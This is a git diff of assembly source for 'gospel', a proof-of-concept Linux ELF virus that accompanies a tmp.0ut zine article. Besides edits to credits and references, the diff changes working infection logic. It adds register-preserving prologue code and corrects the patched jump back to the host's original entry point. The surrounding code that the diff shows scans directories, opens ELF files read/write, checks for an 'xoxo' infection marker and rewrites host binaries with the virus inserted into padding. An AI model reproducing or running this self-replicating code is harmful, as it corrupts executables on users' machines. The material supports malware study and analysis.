@@ -12,10 +12,10 @@ BITS 64
 ; It relies on the use of padding bytes between segments as a page-aligned 
 ; region of available memory.
 ;
-; This PoC virus is created as the accompaniment to my article 
+; This PoC virus for my tmp.0ut  article 
 ; “u used 2 call me on my polymorphic shell phone, pt. 1:  
 ; gospel for a new epoch”
-; to be released in tmp.0ut volume 3.
+; tmp.0ut volume 3.
 ;
 ; **********************
 ; Primary vx references
@@ -55,16 +55,18 @@ BITS 64
 ; ************************
 ; greetz <3
 ; ************************
-; Everyone on the tmp.0ut team 
-; Extra special shoutouts+thank yous to netspooky and sblip for all their support&feedback on this project! 
+; Everyone on the tmp.0ut team for the support/feedback/debugging sessions 
+; Richinseattle, elfmaster, TMZ, B3nny, MalcolmVX, and everyone on the vc debugging calls for being rad <3  
+; Extra special shoutouts and thank you to netspooky and sblip for all of their support and feedback on this project! 
+; Travis Goodspeed 
 ; Silvio (Silvio if you read this then, hello! I love your work!)
-; elfmaster and TMZ for your amazing Linux vx
-; Travisgoodspeed
-; richinseattle, jduck, botvx, mrphrazer, lauriewired
-; zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino, 0daysimpson
-;
-; Everyone in the slop pit and all my homies near + far
-; ilysm xoxoxoxoxoxxo
+; jduck, botvx, mrphrazer, lauriewired
+; 0daysimpson, zeta, dnz, srsns, xcellerator, bane, h0wdy, gren, museifu, domino
+; Aaron DeVera
+; Cabal
+; 
+; Everyone in the slop pit/the Haunted Computer Club and all my homies near + far
+; ilysm xoxoxoxoxoxxo 
 ;
 ; *********************************
 ; References:
@@ -87,8 +89,7 @@ BITS 64
 ; Phrack, Volume 0xa Issue 0x38, 
 ; 05.01.2000, 0x07[0x10],  http://phrack.org/issues/56/7.html#article 
 ; [6] “Getdents.old.att”
-; Github: Jamichaels (sblip),
-; https://gist.github.com/jamichaels/fd6bca66879da9ec0efe 
+; Github: sblip,
 ; [7] "ASM Tutorial for Linux n' ELF file format", BY LiTtLe VxW, 29A issue #8
 ; [8] “Linux virus writing tutorial” [v1.0 at xx/12/99], by mandragore, 
 ; from Feathered Serpents, 29A issue #4
@@ -328,18 +329,44 @@ BITS 64
 ;
 ;PAGESIZE dd 4096	
 ;*******************************************************************************
-;%define vlen equ vend - _start
+section .text
 global _start
 default rel
-section .text
 _start:
+	push rsp ;preserve rsp first since push will alter the value.
+	push rbp
+	push rax
+	push rbx
+	push rcx
+	push rdx
+	push rsi
+	push rdi
+	push r8
+	push r9
+	push r10
+	push r11
+	push r12
+	push r13
+	push r14
+	push r15
 	jmp vxstart
-	;lea rax, [rel vxstart]
-	;jmp rax
+	pop r15
+	pop r14
+	pop r13
+	pop r12
+	pop r11
+	pop r10
+	pop r9
+	pop r8
+	pop rdi
+	pop rsi
+	pop rdx
+	pop rcx
+	pop rbx
+	pop rax
+	pop rbp
+	pop rsp
 	vxsig: db "xoxo",0
-;test:
-	;lea rax, [vxstart]
-	;jmp rax
 
 vxstart:
 	push rbp
@@ -421,8 +448,6 @@ process_dirents:
 check_file:
 	push rcx
 	check_elf:
-		;lea r12, [rcx + r14 + 618]
-		;mov [r14 + 160], r12
 		lea rdi, [rcx + r14 + 618]	;linuxdirent entry filename (linuxdirent.d_nameq) in rdi
 		mov rsi, 0x2 						;flags - read/write (OPEN_RDWR) in rsi
 		xor rdx, rdx						;mode - 0
@@ -438,7 +463,6 @@ check_file:
 		mov rsi, rdi
 		lea rdi, [r14 + 200] 
 		lea rsi, [rdi]
-		;mov rsi, [r14 + 160]	
 		.copy_filename:
 			mov byte al, [rsi]
 			inc rsi
@@ -467,17 +491,14 @@ check_file:
 			cmp rcx, 5
 			jnz .filenameloop
 		jmp checknext
-
 	get_vx_name:
 		call check_vx_name
 		vxname: db "gospel",0		
-
 	get_filestat:
 		lea rsi, [r14]				;size for mmap == e_shoff + (e_shnum * e_shentsize)
 		mov rdi, r8 				;retrieve size from filestat struct with an fstat syscall
 		mov rax, 0x5 ;SYS_FSTAT
 		syscall
-
 ;*******************************************************************************
 		;void *mmap(void addr[.length], size_t length, int prot, int flags,
 		;                  int r14 + 416, off_t offset);
@@ -491,7 +512,6 @@ check_file:
 		xor r9, r9				; offset of 0 within file == start of file, obv	
 		mov rax, 0x9 			;SYS_MMAP
 		syscall
-		
 		cmp rax, 0
 		jb checknext
 		pop r9
@@ -502,7 +522,6 @@ check_file:
 		mov rdi, r9
 		mov rax, 0x3 			;SYS_CLOSE
 		syscall
-	
 		pop rax
 		test rax, rax
 		js checknext
@@ -517,7 +536,6 @@ check_file:
 		cmp word [rax + 16], 0x0003		;elf_ehdr.e_type
 		je check_elf_header_magic_bytes
 		jnz checknext
-
 	check_elf_header_magic_bytes:
 		cmp dword [rax], 0x464c457f		;elf_ehdr.e_ident
 		jnz checknext
@@ -535,32 +553,26 @@ check_file:
 	check_elf_header_arch:
 		cmp byte [rax + 18], 0x3e			;elf_ehdr.e_machine
 		jne checknext
-		
 	verifie_pas_de_vx_sig:
 		lea r13, [rax + 24]					;elf_ehdr.e_entry
 		cmp dword [r13 + 2], 0x786f786f
 		je checknext
-	
 	verifie_deja_infecte:
 		cmp dword [rax + 9], 0x786f786f		;elf_ehdr.ei_padding
 		je checknext
-
 	ready2infect:
 		call infect	
 		jmp painting
-
 	checknext:
 		lea rdi, qword [r14 + 416]
 		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, 0xB ;SYS_MUNMAP
 		syscall
-		
 		pop rcx
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jne check_file
 		;jmp _restore
-
 	painting:
 	call payload
 		db 0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x5b,0x5b,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f
@@ -825,7 +837,6 @@ infect:
 ;	So this is the order in which we will construct (write to) our new complete
 ;	infected ELF -- currently a temp file, to be renamed to that of the host
 ;
-;
 ;	Our plan for building this file will be to do the following:
 ;	create new temp file ".xo.tmp"
 ;	write modified elf header to .xo.tmp
@@ -905,10 +916,10 @@ frankenstein_elf:
 		mov byte [r14 + 150], 0xe8			;call get_rip
 		mov dword [r14 + 151], 0x14			;at offset of 0x14 from curr instruction
 		mov dword [r14 + 155], 0x2d48			;sub rax, vlen
-		mov dword [r14 + 157], vlen			
-		mov dword [r14 + 161], 0x2d48			;sub rax, vlen
+		mov dword [r14 + 157], vlen+5			
+		mov dword [r14 + 161], 0x2d48			;sub rax, vxstart
 		mov dword [r14 + 163], vxstart			
-		mov dword [r14 + 167], 0x0548			;sub rax, vlen
+		mov dword [r14 + 167], 0x0548			;add rax, OEP
 		mov dword [r14 + 169], r11d			
 		mov word [r14 + 173], 0xe0ff			;0xff 0xe0 = jump eax
 		mov dword [r14 + 175], 0x24048b48		;mov rax, [rsp]; <- call get_rip
@@ -967,18 +978,9 @@ frankenstein_elf:
 	.write_padding_after_vx:
 		xor r11, r11
 		xor rsi, rsi
-		;;;mov esi, r10d
-		;;;add esi, 6
-		;;;xor r10, r10
 		mov r11d, dword [PAGESIZE]
-		;;;mov r10d, dword [r14 + 436]
 		;;;add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
 		add r10d, 6							;add 6 bytes for push/ret original entrypoint
-		;;;sub r11d, r10d
-		;mov rsi, r10
-		
-		;;;add esi, r11d		
-		
 		;;previous version with shifts
 		;mov dword [vxdatasegment], r10d
 		;;shr r10d, 12						;divide file offset size by PAGESIZE
@@ -991,12 +993,9 @@ frankenstein_elf:
 		;;add eax, r11d 
 		mov rsi, qword [r14 + 424]		;offset of next segment after .text in host ELF
 		add esi, r11d 
-		;;mov dword [r14 + 444], eax
 		mov dword [r14 + 444], esi		;vx_padding_size (# padding bytes after vx)
-;		mov esi, eax
 		mov rax, 0x4d ;SYS_FTRUNCATE
 		syscall
-
 	.write_remainingsegments_totemp:
 		xor r10, r10
 		mov rdx, qword [r14 + 408]		; original shoff
@@ -1007,7 +1006,6 @@ frankenstein_elf:
 		mov r10d, dword [r14 + 444]		;vx_padding_size (# of bytes of padding after vx)
 		mov rax, 0x12					;SYS_PWRITE64 	equ 0x12
 		syscall
-
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + 48] 			;filestat.st_size
 		sub rdx, qword [r14 + 408]		;original shoff
@@ -1016,34 +1014,28 @@ frankenstein_elf:
 		mov r10d, dword [r14 + 440]		;vx SH offset
 		mov rax, 0x12					;SYS_PWRITE64 	equ 0x12
 		syscall
-
 	.munmap_file_work_area:
 		lea rdi, [r13]					;munmap file from work area
 		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, 0xB 					;SYS_MUNMAP
 		syscall
-
 	.close_temp:		
 		mov rdi, r9						;close temp file
 		mov rax, 0x3 					;SYS_CLOSE
 		syscall
 fin_infect:
 	ret
-;jmp_to_oep:
-;	mov rax, [rsp + 448]
-;	jmp rax
 PAGESIZE: dd 4096	
 ;;restore stack to original state
 _restore:
 	add rsp, 0x2000
 	mov rsp, rbp
 	pop rbp
-
-vlen equ $-vxstart
+vend:
+vlen equ vend - vxstart
 ;get_rip:
 ;	mov rax, [rsp]
 ;	ret
-vend:
 _end:
 	xor rdi, rdi
 	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
